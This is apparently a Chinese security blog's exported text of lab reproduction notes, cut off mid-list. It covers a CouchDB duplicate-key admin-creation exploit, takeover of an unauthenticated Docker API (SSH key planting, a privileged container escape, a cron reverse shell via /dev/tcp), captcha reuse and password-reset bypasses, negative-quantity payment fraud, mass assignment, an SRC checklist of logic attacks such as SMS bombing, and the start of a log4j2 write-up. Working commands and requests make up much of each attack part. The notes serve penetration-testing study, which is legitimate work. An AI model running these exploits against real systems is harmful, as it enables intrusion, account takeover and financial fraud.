1.7.0 and 2.x before 2.1.1 漏洞成因 问题在于 Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为jiffy的解析器之间存在差异。查看每个对象如何处理对象上的重复键，例如：{\"foo\":\"bar\", \"foo\":\"baz\"} Erlang： &gt; jiffy:decode(\"{\\\"foo\\\":\\\"bar\\\", \\\"foo\\\":\\\"baz\\\"}\"). {[{&lt;&lt;\"foo\"&gt;&gt;,&lt;&lt;\"bar\"&gt;&gt;},{&lt;&lt;\"foo\"&gt;&gt;,&lt;&lt;\"baz\"&gt;&gt;}]} JavaScript： &gt; JSON.parse(\"{\\\"foo\\\":\\\"bar\\\", \\\"foo\\\": \\\"baz\\\"}\") {foo: \"baz\"} 对于给定的键，Erlang 解析器将存储这两个值，但 Javascript 解析器将仅存储最后一个值。不幸的是，CouchDB 数据内部表示的 get_value 函数只会返回第一个值： % Within couch_util:get_value lists:keysearch(Key, 1, List). % keysearch(Key, N, TupleList) -&gt; {value, Tuple} | false % Searches the list of tuples TupleList for a tuple whose Nth element compares equal to Key. Returns {value, Tuple} if such a tuple is found, otherwise false. //在元组TupleList列表中搜索其第n个元素比较等于Key的元组。如果找到这样的元组，则返回{value, Tuple}，否则返回false。 因此，我们可以绕过所有相关的输入验证并创建一个管理员用户： curl -X PUT 'http://your-ip:5984/_users/org.couchdb.user:oops' --data-binary '{ \"type\": \"user\", \"name\": \"oops\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"password\" }' js解析只存储第二个值，roles为空，权限放行；但Eralang解析器将解析并存储两个值，但是在CouchDB中get_value函数只返回了jiffy所解析到的第一个键的值，即admin，管理员权限。 注：通过查看源码，权限判断中，只要roles长度大于0就返回forbidden，只有管理员才能进行修改。 所以此POC成功绕过js的检查，并成功被erlang解析为管理员账户。 进入实际环境中会发生如下身份验证过程： JavaScript在检测时，检测我们创建的用户“角色＝０”。无角色，也就不存在权限，所以没有危害，系统判定为安全，绕过了检测。接下来在CouchDB的Erlang部分实现身份验证和授权时，jiffy实现的时候，getter函数只返回第一个值也就是\"roles\": [“_admin”],所以创建出了具有admin权限的账户。 开始复现 访问首页发现是json数据 接下来访问http://127.0.0.1:5984/_utils/ 发现 点击验证数据库正确性，发现我们不是管理员无权操作，这样的话我们尝试直接创建一个管理员用户 接下来用的是网上的poc：用put发送一个请求创建管理员的数据包 PUT /_users/org.couchdb.user:hybcx HTTP/1.1 Host: 124.220.233.26:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \"type\": \"user\", \"name\": \"hybcx\", \"roles\": [\"_admin\"], \"password\": \"hybcx\" } 先用bp抓个包，其实抓不抓都无所谓，我们也可以在终端上通过curl发送put数据包 接下来在bp上，输入上述poc，如下图发现我们不是管理员，无权创建管理员账户 但发送包含两个roles的数据包，即可绕过限制，创建一个管理员账户，这里创建了一个账户密码皆为hybcx的管理员账户，发送如下poc PUT /_users/org.couchdb.user:hybcx HTTP/1.1 Host: 124.220.233.26:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \"type\": \"user\", \"name\": \"hybcx\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"hybcx\" } 可以看到我们成功创建，登录验证一下 也是成功登陆 漏洞修复 patch：加入了dedupe_keys字段用于对重复键的标识，重写了make_object方法，使得jiffy解析JSON的方法和JavaScript一致。 结论：尽量不使用多个解析器处理相同的数据。如果项目使用多种语言，不可避免发生这种情况，应该确保解析器间没有功能差异，如这里JSON 解析标准就没有指定重复键的行为。 参考文章：https://www.cnblogs.com/qweg/p/16574127.html 3. 未经授权访问 漏洞介绍：即游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能 形成原因：主要是系统设计期间没有进行全局用户身份校验；或者校验存在缺陷 漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在 漏洞修复： J2EE中存在filter，可以获取用户的cookie等信息 修复思路： 建立LoginList，值是当前在线用户的id 对所有需要登录访问到URL，获取请求request 再利用 getAttribute(“userid”) 获取其userid 检查userid是否存在于LoginList中，不存在则直接返回错误跳转 值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息 Docker daemon api未授权访问漏洞 漏洞简介 Docker Daemon把服务暴露在tcp的2375端口上，这样就可以在网络上操作Docker了。Docker本身没有身份认证的功能，只要网络上能访问到服务端口，就可以操作Docker。与上面的docker.sock文件利用类似。 简单来说：该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。 环境搭建 为了更贴近实战，所以不使用vulhub搭建docker，直接在宿主机上直接搭建。 首先虚拟机创建一台linux（centos7版本） 机器正常安装好docker 接着进行文件备份（一下均是以root身份操作） cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak 接着编辑 vim /lib/systemd/system/docker.service 把下面一段代码加入文件结尾 [Service] ExecStart= ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 保存并退出编辑后，重载守护进程以及重启Docker： systemctl daemon-reload` service docker restart 通过执行命令查看是否开放了远程访问端口： systemctl status docker.service 如果本地搭建访问不了的话，很大原因是因为防火墙未放行2375端口，放行端口后就可以在其他机器访问到了 如何在防火墙开启下，放行端口以至于外部可以访问 添加 firewall-cmd --zone=public --add-port=5005/tcp --permanent （--permanent永久生效，没有此参数重启后失效） 添加端口外部访问权限（这样外部才能访问） firewall-cmd --add-port=5005/tcp 重新载入，添加端口后重新载入才能起作用 firewall-cmd --reload 这些之后，端口是开启成功的，如果没有成功，重启系统试试。 漏洞检测+利用 访问192.168.4.92:2375/version，若能访问，证明存在未授权访问漏洞。 目标机：192.168.4.92 攻击机：124.220.233.26 写入密钥免密登陆 在已经安装docker的vps上，使用-H参数连接目标主机的docker，使用images命令查询目标系统存在的镜像。 使用docker命令创建一个容器，并将宿主机的磁盘挂载到容器中 docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt a98b9e39cc6d /bin/bash a98b9e39cc6d 是镜像的ID 这条命令的意思是启动一个image ID 为a98b9e39cc6d的容器，并且将该宿主机的根目录挂在到容器的/mnt目录下 如果目标机器上没有镜像就需要先pull一个镜像到目标机上。 docker -H tcp://192.168.4.92:2375 pull busybox 这个镜像很小，方便下载。 有镜像之后就很方便利用了。 docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bash docker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh //换成sh的原因可能是，我这里用的finalshell的ssh连接的目标机 docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh 启动之后就会获得该容器宿主机的shell 因为我们把主机的根目录挂在到了这个容器的/mnt容器下，所以我们可以直接往主机的/root/.ssh目录下写authorized_keys 我们将攻击机的公钥写入authorized_keys 这里我之前目标机与kali都没有公钥，产生公钥可以参考文章：Linux实现ssh免密 成功免密登陆目标服务器 ssh root@192.168.4.92 写入计划任务反弹shell 因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在kali上通过远程方式连接doker 前面的操作都一致 唯一不同的就是写的命令和路径 有很多种写计划任务的方法 docker -H tcp://192.168.4.92:2375 ps docker -H tcp://192.168.4.92:2375 images 链接进去之后，发现没有镜像文件，那么去官方下载一个镜像文件busybox docker -H tcp://192.168.241.142:2375 pull busybox 接下来启动容器，并进入 busybox 容器 docker -H tcp://192.168.4.92:2375 images docker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh #在kali中启动一个有交互的shell，并且是特权镜像 #当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。 进入容器后，使用fdisk -l命令查看磁盘文件 注意：在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。 从返回的type信息中可以判断出，/dev/sda2是主分区，那么接下里直接在容器内部挂载宿主机磁盘 新建一个目录：mkdir wxiaoge 挂载磁盘到新建目录：mount dev/sda2 wxiaoge 进入目录：cd wxiaoge/ 新建文件：touch wxiaoge.txt 接下来看一下靶机中确实创建了 wxiaoge.txt 文件，docker逃逸成功 接下来可以反弹主机shell 创建 wxiao.sh 文件 vi wxiaoge.sh 写入反弹 shell #!/bin/bash #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin bash -c \"bash -i &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1\" 之后给 wxiao.sh 添加执行权限，并且写入到定时任务中 chmod +x wxiao.sh echo '*/1 * * * * /wxiao.sh' &gt;&gt; /wxiaoge/var/spool/cron/root #每分钟执行一次wxiaoge.sh 文件 kali打开监听端口 一分钟后成功返回 shell 参考文章：https://www.modb.pro/db/152994 漏洞修复： 1.关闭2375端口 （尤其是公网情况下一定要禁用此端口） 2.在防火墙上配置禁止外网访问2375端口 2.5 图形验证码漏洞 1. 图形验证码突破 漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击 漏洞原理： 图形验证码在错误后未失效 返回验证码信息 分步验证验证码 漏洞点：任何存在图形验证码的功能中 漏洞修复 一旦验证码使用过了，必须要进行删除，重新生成验证码，可以梵高attribute中 验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码 验证码只需要返回图片，切勿将生成验证码的字符串也一并返回 验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误 pikachu-on server 测试结果：验证码有验证、无回显，但存在验证码固定（可重复使用）的设计缺陷。 以下为验证码固定问题测试过程和源码分析。 测试过程 输入不正确的账户/密码及正确的验证码测试 重复提交该数据包均只返回用户名或密码错误，说明存在验证码固定漏洞。 所以我们可利用此漏洞绕过验证码直接对用户名和密码进行暴力破解。 源码分析 文件：\\vul\\burteforce\\bf_server.php 关键代码： 在用户名、密码和验证码均不为空的情况下判断输入验证码是否与生成后保存在session中的验证码相同，但比较完后没有删除该session[vcode],导致下一个数据包输入该验证码也会判断正确，出现验证码重复使用问题。 凭借此漏洞，我们可以对用户名与密码进行爆破，验证码随意即可（但要保证该验证码是在校验页面出现过的验证码） pikachu-on client 测试过程 通过查看源码发现前端JS判断验证码是否正确，所以先输入正确的验证码绕过前端判断。 输入不正确的账户/密码及验证码进行抓包测试。 由于已经绕过前端js对验证码的判断，可以将请求包中的验证码参数删除。（可以删除vcode参数） 再将数据包发送到intruder对用户名和密码进行暴力破解即可。 源码分析 可以看到这里进行的前端js校验 更多参考：https://xz.aliyun.com/t/6971#toc-20 2.6 找回密码逻辑漏洞 1. 密码找回漏洞 漏洞介绍：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全 漏洞原理：其实是验证码漏洞的一种： 验证码时间长可爆破 返回重置密码凭证 若加密的重置密码凭证 漏洞点：任何密码找回处（可延伸至相似具有验证功能） 修改接受校验码目标 漏洞修复 一旦验证码使用过了，必须要进行删除，重新生成验证码，可以放到attribute中 验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码 校验凭证不能够随着返回包进行返回 验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误 校验凭证的生成需要进行随机生成，防止凭证破解 用户身份凭证和权限类漏洞修复一样，需要从attribute中获取 登录密码重置漏洞-墨者学院 靶场地址：https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH 打开靶场界面如下： 1、通过“朝阳群众”的举报，证实手机号“17101304128”在系统平台从事非法集资、诈骗活动。 2、请重置“17101304128”登录密码，以便登录获取完整的数字证据 点击进入重置密码，来到密码重置界面 已注册的手机号为18868345809 先输入手机号17101304128，输入新密码：图形验证码，点击获取短信验证码 提示：已发送至该手机，短信已发送有效期为5分钟 再输入我已注册的手机号18868345809，设置新密码，验证码，获取验证码 得到验证码：Vxka6a 漏洞点：他说短信已发送至该手机，可是这手机号也不是我的呀，我并不知道验证码是啥。此时就可以大胆的猜想一下，它这个网站的逻辑会不会出现问题，只是统一验证输入的验证码是否是正确的，而没有对绑定的手机号进行校验。我们可以使用刚才得到的验证码863bTV来尝试重置，成功得到key值。 第二种做法：先用自身的账号进行密码重置流程，在得到验证码后，bp抓包修改手机号参数（换成目标手机号即可）这样同样可以的到key，两种想法都一样，只不过第二种似乎更好理解 2.7 业务数据篡改漏洞 1. 业务数据篡改（赋值反冲） 漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利 漏洞原理： 没有对传输数据添加相关的校验参数 后台未对参数值进行校验并直接使用数据包中的参数 漏洞点：抽奖、购买、转账、返现等功能 漏洞修复： 对于软件来说，需要保护好内存数据，防止内存数据篡改 计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改 先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值） dami__cms-0元支付漏洞 直接小p一把梭，注册登录cms看到如上页面 点击在线充值、我要提现，看到当前余额是0 点击产品展示、大米测试产品 点击立即购买 填写完整送货地址，将付款方式修改为站内扣款 点击提交订单，同时使用burp进行抓包操作 将qty参数修改为-1，然后点击Forward，并取消抓包 可以看到订单已经提交成功了 此时查看提现页面的余额已经变为6000，也就是将订单中的-6000反加到了账户余额中 利用0元支付漏洞，在网站商城进行购买操作时，可无需支付货币，对商城造成极大危害。 应明确业务逻辑，防止出现此情况 2.8 执行顺序逻辑漏洞 1. 执行顺序篡改 漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果 漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付 漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中 漏洞修复 在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作 也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验 再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户 2.9 其他类型逻辑漏洞 1. 条件竞争漏洞 漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效 漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞 漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法 漏洞修复 修复思路：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程 并不是每个条件竞争都必须修复 2. 数据包重放漏洞 漏洞介绍：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等 漏洞原理：后台未进行相关操作的技术导致数据包重放 漏洞点：短信验证码、邮件校验、提交订单等功能。 修复方案： 修复思路（针对短信、邮件） 构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数 只要某个邮箱或者电话号码次数够了，就不能继续发送了 或者计算两次发送的时间间隔，时间过短就不继续发送了 通用修复方案 需要建立token机制或验证码机制，一次有效 3. 参数绑定漏洞 漏洞介绍：通过添加对象字段相关参数进行数据篡改 漏洞原理：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改 漏洞点：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。 漏洞修复：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数 这里了解一下该漏洞产生原理吧 软件框架有时允许开发人员自动将HTTP请求参数绑定到程序变量或对象中，以使开发人员更容易使用该框架开发。这有时会造成伤害。攻击者有时可以使用这种方法来创建，修改，更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象。 因此就拿Spring MVC中的自动绑定作为举例，假设有一个用户提交基本信息的功能： 首先看前端html： &lt;form action=“addUserInfo” method=\"post\"&gt; &lt;input name=username type=text&gt;&lt;br&gt; &lt;input name=phone type=text&gt;&lt;br&gt; &lt;input name=email text=text&gt;&lt;br&gt; &lt;input type=submit&gt; &lt;/form&gt; 很简单，一个form表单，通过post提交username，phone，email到addUserInfo。 我们看一下用户的实体类： public class User { private String userid; private String username; private String phone; private String email; private boolean isAdmin; //Getters &amp; Setters } 可以看到User的实体类存在除了username，phone，email还有比较重要的userid和isAdmin参数。 我们接下来看一下controller层如果利用了自动绑定可以写出的处理方式： @RequestMapping(value = \"/addUserInfo\", method = RequestMethod.POST) public String submit(User user) { userService.add(user); return \"successPage\"; } 针对上述代码，给出GPT回答 这段Java代码是一个简单的Spring MVC控制器方法，它处理HTTP POST请求并将用户信息保存到数据库中。让我们逐行来分析它： 1. `@RequestMapping(value = \"/addUserInfo\", method = RequestMethod.POST)`: 这是一个Spring MVC注解，用于将HTTP请求映射到控制器方法。在这里，它将HTTP POST请求映射到\"/addUserInfo\"路径，表示该方法将处理该路径的POST请求。 2. `public String submit(User user) {`: 这是控制器方法的声明，它接受一个名为\"User\"的参数。这里假设\"User\"是一个Java类，用于表示用户信息。 3. `userService.add(user);`: 在这一行，代码调用一个名为\"userService\"的服务（Service）类的\"add\"方法，并传入\"user\"作为参数。这表示将用户信息保存到数据库中，可能是由\"userService\"处理数据持久化的操作。 4. `return \"successPage\";`: 最后，控制器方法返回一个字符串\"successPage\"。这通常用于将请求的处理结果返回给用户，告诉用户请求已成功处理。在这里，\"successPage\"可能是一个视图名称，它会被解析为一个实际的页面，展示给用户，用于确认操作已成功完成。 总结：这段代码是一个用于处理HTTP POST请求的Spring MVC控制器方法。它接受一个\"user\"对象作为参数，将用户信息保存到数据库中，并返回一个名为\"successPage\"的字符串，用于告知用户操作已成功完成。具体的用户信息保存逻辑和\"successPage\"页面的展示取决于代码中其他部分，例如\"userService\"类和视图解析器的配置。 潜在危害 结合上面的demo，我们可以看到，controller层使用的自动绑定对象的方式，也就是使用了post请求的参数直接绑定到了User，虽然前端form表单中仅出现了username，phone，email，但是如果使用burp等工具向addUserInfo发送了 POST /addUserInfo username=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true 或者 POST /addUserInfo username=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid 那么如果后续使用了被污染的对象的被污染的属性，那么就会产生一定的安全问题。 自动绑定漏洞并非仅在Spring MVC中可能出现，只要有自动绑定功能的框架都可能出现这样的逻辑问题。 但是可能对于大部分安全人员来说，可能面对的是一个黑盒的环境，很难发现controller层或者orm是否存在这样的问题，那么可能就需要多个表单的交叉对比，推测出可能出现问题的点了。 修复建议 通用修复方法是：避免将输入直接绑定到域对象，只有用户可以编辑的字段才包含在DTO中。以上文中的deom为例： public class UserRegistrationFormDTO { private String username; private String password; private String email; //Getters &amp; Setters } 或者可以修改controller层，仅接收用户可以修改的参数： @RequestMapping(value = \"/addUserInfo\", method = RequestMethod.POST) public String submit(String username,String phone,String email) { userService.add(username,phone,email); return \"successPage\"; } 也可以设置白名单： @Controller public class UserController { @InitBinder public void initBinder(WebDataBinder binder, WebRequest request) { binder.setDisallowedFields([\"isAdmin\"]); } ... } 3.0 SRC中的逻辑漏洞总结 1. 注册： 短信轰炸 验证码安全问题 密码爆破 邮箱轰炸 2. 用户任意注册、批量注册 3. 用户名枚举 4. XSS（有框的地方就可以尝试插XSS） 5. 登录： 短信轰炸、验证码安全问题、密码爆破、邮箱轰炸 SQL注入 撞库 抓包把password字段修改为空值发送 认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号 Cookie仿冒 修改返回包的相关数据，可能会登陆到其他的用户 6. 找回密码： 短信邮箱轰炸、短信邮箱劫持 重置任意用户账户密码、验证码手机用户未统一验证 直接跳过验证步骤 7. 购买支付、充值（要利用抓包去仔细查看每一个可用的参数） 交易金额、数量修改、更换支付模块（比如更换支付的模块金额） 交易信息订单编码/导致信息泄露 整数溢出，int最大值为2147483647，超过最大值 修改充值账户 支付绕过 8. 抽奖活动 刷奖品、积分 并发 9. 优惠卷、代金卷 并发逻辑漏洞（burp批量获取优惠券） 修改优惠券金额、数量 10. 订单信息 订单信息遍历、泄露 订单信息泄露导致用户信息泄露 删出他人订单 11. 会员系统 修改个人信息上传文件，上传带弹窗的html 如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测 图片上传也可能遇到imagereagick命令执行，上传恶意图片 视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf 用户横向越权访问、遍历、导致用户信息泄露 SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS 12. 传输过程 明文传输账户密码 修改信息处无session/token导致csrf POST/COOKIE注入 13. 评论 POST注入 存储型XSS 无session/token导致CSRF 1. 验证码问题 万能验证码 返回包中存在验证码 删除验证码或者cookie中的值可以爆破账号密码 2. 短信轰炸 一直重放 删除修改cookie，重放数据包 遍历参数发送数据包 手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包 请求参数修改大小写，或者添加请求参数比如&amp;id=1 一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口 如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显 3. 水平越权 主要登陆后还是修改参数，主要找到多个接口不断测试 关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测 多个账号，主要分析请求参数 4. 数据泄露 再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回 5. 任意用户密码重置 目前大部分都是在修改密码处参数修改 有些是前端验证 支付逻辑漏洞 1. 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户 2. 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。 3. 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包 4. 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。 5. 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。 6. 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。 7. 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。 8. 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家 9. 单位替换：产生在paypal类似的国际支付的场景。 10. 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西 11. 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。 12. 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。 13. 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。 14. heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。 该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。 1. 修改返回包的越权 修改手机号 一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改 如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过 比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞 2. 登录绕过 部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号 3. 水平越权 遍历ID 在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题 4. ID替换 如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题 5. 垂直越权 观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改","categories":["常见top漏洞"]},{"title":"log4j2远程命令执行漏洞复现（CVE-2021-44228）","path":"/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/","content":"Apache log4j2 远程命令执行漏洞复现 0x01 前言 Apache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷纷中招，与之前的fastjson、shiro漏洞相比更为严重，预计在之后的三四年中漏洞会一直存在。此漏洞影响范围特别广泛，漏洞利用门槛低，危害程度非常大，如果被攻击者恶意利用，危害程度不亚于2017年爆发的“永恒之蓝”漏洞。以下图片来源于网络 0x02 漏洞简介 Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。 漏洞编号：CVE-2021-44228 漏洞等级：紧急 CVSS评分：10（最高级） 影响版本：Apache log4j2 2.0 - 2.14.1 安全版本：Apache log4j-2.15.0-rc2 更多关于此漏洞的详细分析：Log4j高危漏洞！具体原因解析！全网第一 0x03 影响范围 该漏洞影响范围极广、危害极大，主要由于该组件应用范围十分广泛，所有使用该组件的所有产品都会受到漏洞影响，因此对其下游造成的软件供应链安全隐患巨大。 目前已知的可能受影响的应用及组件包括但不限于如下： 组件名称 版本信息 Apache Struts2 全版本 ElasticSearch 5.x，6.x，7.x，8.0.0beta1，8.0.0alpha1和8.0.0alpha2 Logstash 5.0.0至最新 Apache Flink 1.11.0-rc1 到 1.14.0 Apache Druid 0.7.x以上 Hadoop Hive 2.x和3.x Apache Log4j SLF4J Binding ‘2.14.1’, ‘2.14.0’, ‘2.13.3’, ‘2.13.2’, ‘2.13.1’, ‘2.13.0’, ‘2.12.1’, ‘2.12.0’, ‘2.11.2’, ‘2.11.1’, ‘2.11.0’, ‘2.10.0’, ‘2.9.1’, ‘2.9.0’, ‘2.8.2’, ‘2.8.1’, ‘2.8’, ‘2.7’, ‘2.6.2’, ‘2.6.1’, ‘2.6’, ‘2.5’, ‘2.4.1’, ‘2.4’, ‘2.3’, ‘2.2’, ‘2.1’, ‘2.0.2’, ‘2.0.1’, ‘2.0’, ‘2.0-rc2’, ‘2.0-rc1’, ‘2.0-beta9’, ‘2.0-beta8’, ‘2.0-beta7’, ‘2.0-beta6’, ‘2.0-beta5’ Spring Boot ‘2.6.1’, ‘2.6.0’, ‘2.5.7’, ‘2.5.6’, ‘2.5.5’, ‘2.5.4’, ‘2.5.3’, ‘2.5.2’, ‘2.5.1’, ‘2.5.0’, ‘2.4.13’, ‘2.4.12’, ‘2.4.11’, ‘2.4.10’, ‘2.4.9’, ‘2.4.8’, ‘2.4.7’, ‘2.4.6’, ‘2.4.5’, ‘2.4.4’, ‘2.4.3’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.12.RELEASE’, ‘2.3.11.RELEASE’, ‘2.3.10.RELEASE’, ‘2.3.9.RELEASE’, ‘2.3.8.RELEASE’, ‘2.3.7.RELEASE’, ‘2.3.6.RELEASE’, ‘2.3.5.RELEASE’, ‘2.3.4.RELEASE’, ‘2.3.3.RELEASE’, ‘2.3.2.RELEASE’, ‘2.3.1.RELEASE’, ‘2.3.0.RELEASE’, ‘2.2.13.RELEASE’, ‘2.2.12.RELEASE’, ‘2.2.11.RELEASE’, ‘2.2.10.RELEASE’, ‘2.2.9.RELEASE’, ‘2.2.8.RELEASE’, ‘2.2.7.RELEASE’, ‘2.2.6.RELEASE’, ‘2.2.5.RELEASE’, ‘2.2.4.RELEASE’, ‘2.2.3.RELEASE’, ‘2.2.2.RELEASE’, ‘2.2.1.RELEASE’, ‘2.2.0.RELEASE’, 